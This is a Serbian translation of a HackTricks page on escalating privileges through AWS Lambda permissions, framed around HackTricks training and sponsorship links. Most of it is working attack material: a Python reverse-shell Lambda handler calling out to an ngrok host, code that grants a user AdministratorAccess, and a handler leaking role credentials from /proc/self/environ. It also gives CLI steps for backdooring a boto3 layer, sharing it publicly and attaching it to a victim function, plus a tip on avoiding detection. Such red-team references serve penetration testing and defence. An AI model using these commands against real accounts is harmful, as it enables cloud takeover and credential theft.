# AWS - Lambda Privesc

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## lambda

Više informacija o lambda funkcijama možete pronaći u:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa dozvolama **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogu povećati svoje privilegije.\
Oni mogu **kreirati novu Lambda funkciju i dodeliti joj postojeću IAM ulogu**, dodeljujući funkciji dozvole povezane sa tom ulogom. Korisnik može zatim **napisati i otpremiti kod na ovu Lambda funkciju (na primer, sa reverzibilnom ljuskom)**.\
Kada je funkcija podešena, korisnik može **pokrenuti njeno izvršavanje** i željene akcije pozivanjem Lambda funkcije putem AWS API-ja. Ovaj pristup omogućava korisniku da indirektno obavlja zadatke putem Lambda funkcije, radeći sa nivoom pristupa koji je dodeljen IAM ulozi povezanoj sa njom.\

Napadač bi mogao iskoristiti ovo da dobije **reverzibilnu ljusku i ukrade token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Takođe možete **zloupotrebiti dozvole uloge lambda funkcije** iz same lambda funkcije.\
Ako uloga lambda funkcije ima dovoljno dozvola, možete je koristiti da vam dodeli administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Takođe je moguće procuriti akreditacije uloge lambda funkcije bez potrebe za spoljnom vezom. Ovo bi bilo korisno za izolovane lambda funkcije koje se koriste za interne zadatke. Ako postoje nepoznate sigurnosne grupe koje filtriraju vaše obrnute ljuske, ovaj deo koda će vam omogućiti direktno procurivanje akreditacija kao izlaz lambda funkcije.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencijalni uticaj:** Direktno povećanje privilegija ka proizvoljnoj ulozi lambda servisa koja je specificirana.

{% hint style="danger" %}
Napomena da čak i ako izgleda interesantno **`lambda:InvokeAsync`** **ne dozvoljava samostalno izvršavanje `aws lambda invoke-async`**, takođe vam je potrebno `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao i u prethodnom scenariju, možete **dodeliti sebi dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktno povećanje privilegija na određenu ulogu usluge lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa dozvolama **`iam:PassRole`, `lambda:CreateFunction` i `lambda:CreateEventSourceMapping`** (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **povećati privilegije** čak i bez `lambda:InvokeFunction`. 
Mogu kreirati **Lambda funkciju sa zlonamjernim kodom i dodijeliti joj postojeću IAM ulogu**.

Umjesto direktnog pozivanja Lambda funkcije, korisnik postavlja ili koristi postojeću DynamoDB tabelu, povezujući je sa Lambda funkcijom putem mapiranja izvora događaja. Ova postavka osigurava da Lambda funkcija bude **automatski pokrenuta prilikom unosa nove stavke** u tabelu, bilo korisnikovom akcijom ili drugim procesom, čime se indirektno poziva Lambda funkcija i izvršava kod sa privilegijama proslijeđene IAM uloge.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB već aktivan u AWS okruženju, korisnik samo **treba uspostaviti mapiranje izvora događaja** za Lambda funkciju. Međutim, ako se DynamoDB ne koristi, korisnik mora **kreirati novu tabelu** sa omogućenim strimovanjem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguće **povezati Lambda funkciju sa DynamoDB tabelom** kreiranjem mapiranja izvora događaja:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Sa Lambda funkcijom povezanom sa DynamoDB stream-om, napadač može **indirektno pokrenuti Lambda funkciju aktiviranjem DynamoDB stream-a**. To se može postići **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni uticaj:** Direktno povećanje privilegija na određenu ulogu usluge lambda.

### `lambda:AddPermission`

Napadač sa ovim ovlašćenjem može **dodeliti sebi (ili drugima) bilo koja ovlašćenja** (ovo generiše politike zasnovane na resursima za dodelu pristupa resursu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencijalni uticaj:** Direktno povećanje privilegija ka ulozi usluge lambda omogućava promenu koda i njegovo izvršavanje.

### `lambda:AddLayerVersionPermission`

Napadač koji ima ovu dozvolu može **dodeliti sebi (ili drugima) dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti sloju i tražiti ranjivosti ili osetljive informacije.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencijalni uticaj:** Potencijalni pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji imaju dozvolu **`lambda:UpdateFunctionCode`** imaju mogućnost da **izmene kod postojeće Lambda funkcije koja je povezana sa IAM ulogom.**\
Napadač može **izmeniti kod lambda funkcije kako bi izvukao IAM akreditive**.

Iako napadač možda nema direktnu mogućnost da pozove funkciju, ako je Lambda funkcija već postojala i operativna, verovatno će biti pokrenuta putem postojećih radnih tokova ili događaja, čime se indirektno omogućava izvršavanje izmenjenog koda.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencijalni uticaj:** Direktno povećanje privilegija na korišćenu ulogu usluge lambda.

### `lambda:UpdateFunctionConfiguration`

#### Uvod

[**Lambda slojevi**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omogućavaju uključivanje **koda** u vašu lambda funkciju, ali ga **posebno skladište**, tako da kod funkcije može ostati mali i **više funkcija može deliti kod**.

Unutar lambda funkcije možete proveriti putanje sa kojih se učitava Python kod pomoću funkcije kao što je sledeća:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su mesta:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se učitava sa `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

**Povezivanje sloja sa funkcijom** zahteva samo dozvolu `lambda:UpdateFunctionConfiguration` i **slojevi se mogu deliti između naloga**. Takođe bismo trebali da znamo **koje biblioteke koriste**, kako bismo ih pravilno prebrisali, ali u ovom primeru ćemo samo **pretpostaviti da napadnuta funkcija uvozi boto3**.

Da bismo bili sigurni, koristićemo Pip da instaliramo istu verziju biblioteke boto3 iz Lambda runtime-a koju ciljamo (Python 3.7), samo da ne bi bilo ničega drugačijeg što bi moglo izazvati probleme u ciljnoj funkciji. Trenutno se koristi verzija 1.9.42 biblioteke boto3.

Pomoću sledećeg koda, instaliraćemo verziju 1.9.42 biblioteke boto3 i njene zavisnosti u lokalni folder "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Zatim ćemo otvoriti `/lambda_layer/boto3/__init__.py` i dodati zlonamerni kod. Payload koji ćemo dodati izgleda ovako:

![](<../../../.gitbook/assets/image (26).png>)

`requests` se uvozi iz `botocore`. Funkcija će eksfiltrirati env promenljive, a try-except i 0.1 timeout su tu da osiguraju da ovaj kod ne pokvari ništa.

{% hint style="info" %}
**Važna napomena:** Više ne biste trebali koristiti `from botocore.vendored import requests` u stvarnim pentestovima, jer će se "DeprecationWarning" ispisati u CloudWatch logovima te funkcije, što će verovatno dovesti do otkrivanja od strane odbrambenih mehanizama.
{% endhint %}

Sada, spakujte taj kod u **ZIP fajl** i **uploadujte** ga na **novi Lambda sloj u napadačkom nalogu**. Prvo ćete morati da napravite folder "python" i stavite svoje biblioteke tamo, tako da kada ga uploadujemo na Lambda, kod će biti pronađen na "/opt/python/boto3". Takođe, pobrinite se da je sloj kompatibilan sa Python 3.7 i da je **sloj u istom regionu kao naša ciljna funkcija**. Kada to bude završeno, koristićemo `lambda:AddLayerVersionPermission` da **omogućimo javni pristup sloju** kako bi ga naš ciljni nalog mogao koristiti. Koristite svoje lične AWS akreditive za ovaj API poziv.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Sada, sa **kompromitovanim akreditacijama** koje imamo, pokrenućemo sledeću komandu na ciljnoj Lambda funkciji "s3-getter", koja će **povezati našu Lambda sloj preko različitih naloga**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
Sledeći korak bio bi ili **pozvati funkciju** sami ako možemo ili sačekati da se ona pozove na uobičajeni način - što je sigurniji metod.

**Još prikriveniji način za iskorišćavanje ove ranjivosti** može se pronaći u:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktno povećanje privilegija na korišćenu ulogu lambda servisa.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Možda sa ovim dozvolama možete kreirati funkciju i izvršiti je pozivajući URL... ali nisam mogao pronaći način da to testiram, pa mi javite ako vi uspete!

### Lambda MitM

Neke lambda funkcije će **primati osetljive informacije od korisnika putem parametara**. Ako dobijete RCE u jednoj od njih, možete izfiltrirati informacije koje drugi korisnici šalju, proverite to u:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
